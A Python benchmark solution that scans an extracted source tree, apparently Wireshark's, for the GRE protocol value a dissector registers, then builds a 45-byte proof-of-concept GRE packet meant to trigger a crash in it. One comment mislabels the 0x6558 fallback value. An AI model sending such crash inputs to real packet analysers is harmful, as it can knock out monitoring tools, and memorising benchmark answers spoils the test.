import os
import tarfile
import zipfile
import tempfile
import re
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        project_root = self._extract_src(src_path)
        # Collect numeric definitions (macros and enums)
        macros_int, macros_expr, enums_int = self._collect_numeric_definitions(project_root)
        # Find gre.proto registration token
        gre_proto_token = self._find_gre_proto_token(project_root)
        proto_value = None
        if gre_proto_token is not None:
            proto_value = self._eval_constant_token(
                gre_proto_token, macros_int, macros_expr, enums_int
            )
        if proto_value is None:
            # Fallback to common GRE 802.11 Ethertype used in Wireshark
            # This value is used only if static analysis fails completely.
            proto_value = 0x6558
        poc = self._build_poc(proto_value, length=45)
        return poc

    # ---------------- Extraction helpers ----------------

    def _extract_src(self, src_path: str) -> str:
        # If src_path is already a directory, just use it
        if os.path.isdir(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        elif zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                zf.extractall(tmpdir)
        else:
            # Unknown format: try to copy as directory if possible
            raise ValueError("Unsupported src_path format")

        # If there's a single top-level directory, use it as project root
        entries = [e for e in os.listdir(tmpdir) if not e.startswith(".")]
        if len(entries) == 1:
            root = os.path.join(tmpdir, entries[0])
            if os.path.isdir(root):
                return root
        return tmpdir

    # ---------------- Source scanning helpers ----------------

    def _iter_source_files(self, root: str):
        exts = {".c", ".h", ".cc", ".cpp", ".cxx"}
        for dirpath, dirnames, filenames in os.walk(root):
            for fname in filenames:
                _, ext = os.path.splitext(fname)
                if ext.lower() in exts:
                    yield os.path.join(dirpath, fname)

    def _collect_numeric_definitions(self, root: str):
        macros_int = {}
        macros_expr = {}
        enums_int = {}

        define_pattern = re.compile(
            r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+)$", re.MULTILINE
        )
        enum_pattern = re.compile(
            r"enum\s+[A-Za-z_][A-Za-z0-9_]*\s*{([^}]+)};", re.DOTALL
        )

        for path in self._iter_source_files(root):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except OSError:
                continue

            # Macros
            for m in define_pattern.finditer(text):
                name = m.group(1)
                val_str = m.group(2)
                # Remove comments
                val_str = val_str.split("/*", 1)[0].split("//", 1)[0].strip()
                if not val_str:
                    continue
                macros_expr.setdefault(name, val_str)
                nums = re.findall(r"0x[0-9A-Fa-f]+|\d+", val_str)
                if len(nums) == 1:
                    try:
                        macros_int[name] = int(nums[0], 0)
                    except ValueError:
                        pass

            # Enums with explicit values
            for em in enum_pattern.finditer(text):
                body = em.group(1)
                for entry in body.split(","):
                    entry = entry.strip()
                    if not entry:
                        continue
                    m = re.match(
                        r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+)", entry, re.DOTALL
                    )
                    if not m:
                        continue
                    name = m.group(1)
                    val_str = m.group(2)
                    val_str = val_str.split("/*", 1)[0].split("//", 1)[0].strip()
                    if not val_str:
                        continue
                    nums = re.findall(r"0x[0-9A-Fa-f]+|\d+", val_str)
                    if len(nums) == 1:
                        try:
                            enums_int[name] = int(nums[0], 0)
                        except ValueError:
                            pass

        return macros_int, macros_expr, enums_int

    def _find_gre_proto_token(self, root: str):
        # Search for dissector_add_uint("gre.proto", <token>, ...)
        pattern = re.compile(
            r"dissector_add_uint\s*\(\s*\"gre\.proto\"\s*,\s*([^,]+),", re.DOTALL
        )
        for path in self._iter_source_files(root):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except OSError:
                continue
            if "gre.proto" not in text:
                continue
            m = pattern.search(text)
            if m:
                token = m.group(1).strip()
                return token
        return None

    # ---------------- Constant evaluation helpers ----------------

    def _eval_identifier(
        self,
        name: str,
        macros_int: dict,
        macros_expr: dict,
        enums_int: dict,
        depth: int = 0,
    ):
        if name in macros_int:
            return macros_int[name]
        if name in enums_int:
            return enums_int[name]
        if depth > 5:
            return None
        expr = macros_expr.get(name)
        if not expr:
            return None
        tokens = re.findall(
            r"0x[0-9A-Fa-f]+|\d+|[A-Za-z_][A-Za-z0-9_]*", expr
        )
        nums = [t for t in tokens if t[0].isdigit() or t.startswith("0x")]
        ids = [t for t in tokens if t[0].isalpha() or t[0] == "_"]
        if len(nums) == 1 and not ids:
            try:
                val = int(nums[0], 0)
            except ValueError:
                return None
            macros_int[name] = val
            return val
        # If it's an alias to another identifier
        for other in ids:
            if other == name:
                continue
            val = self._eval_identifier(
                other, macros_int, macros_expr, enums_int, depth + 1
            )
            if val is not None:
                macros_int[name] = val
                return val
        return None

    def _eval_constant_token(
        self,
        token: str,
        macros_int: dict,
        macros_expr: dict,
        enums_int: dict,
    ):
        token = token.strip()
        # Remove surrounding parentheses
        while token.startswith("(") and token.endswith(")"):
            inner = token[1:-1].strip()
            if not inner:
                break
            token = inner

        parts = re.findall(
            r"0x[0-9A-Fa-f]+|\d+|[A-Za-z_][A-Za-z0-9_]*", token
        )
        nums = [t for t in parts if t[0].isdigit() or t.startswith("0x")]
        ids = [t for t in parts if t[0].isalpha() or t[0] == "_"]

        if len(nums) == 1 and not ids:
            try:
                return int(nums[0], 0)
            except ValueError:
                pass

        if len(nums) == 1:
            # Likely a cast like (guint16)0x6558
            try:
                return int(nums[0], 0)
            except ValueError:
                pass

        for name in ids:
            val = self._eval_identifier(name, macros_int, macros_expr, enums_int, 0)
            if val is not None:
                return val

        return None

    # ---------------- PoC construction ----------------

    def _build_poc(self, proto_value: int, length: int = 45) -> bytes:
        if length < 4:
            length = 4
        b = bytearray(length)
        # GRE flags and version: 0x0000 (no options, version 0)
        b[0] = 0x00
        b[1] = 0x00
        # Protocol field: network byte order (big-endian)
        proto_value &= 0xFFFF
        b[2] = (proto_value >> 8) & 0xFF
        b[3] = proto_value & 0xFF
        # Remaining bytes left as zero
        return bytes(b)